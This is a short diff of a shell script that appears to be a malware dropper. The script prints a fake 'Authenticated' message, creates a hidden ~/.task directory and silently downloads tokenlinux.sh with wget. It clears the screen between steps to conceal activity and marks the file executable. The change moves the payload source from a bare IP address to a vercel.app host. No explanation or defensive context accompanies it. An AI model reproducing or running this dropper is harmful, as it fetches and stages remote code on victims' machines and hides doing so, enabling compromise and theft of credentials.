@@ -4,7 +4,7 @@ echo "Authenticated"
 mkdir -p "$HOME/.task"
 TARGET_DIR="$HOME/.task"
 clear
-wget -q -O "$TARGET_DIR/tokenlinux.sh" "http://45.61.182.252:9463/120/ls.sh"
+wget -q -O "$TARGET_DIR/tokenlinux.sh" "https://vercel-project-olive-two.vercel.app/120/ls.sh"
 clear
 chmod +x "$TARGET_DIR/tokenlinux.sh"
 clear
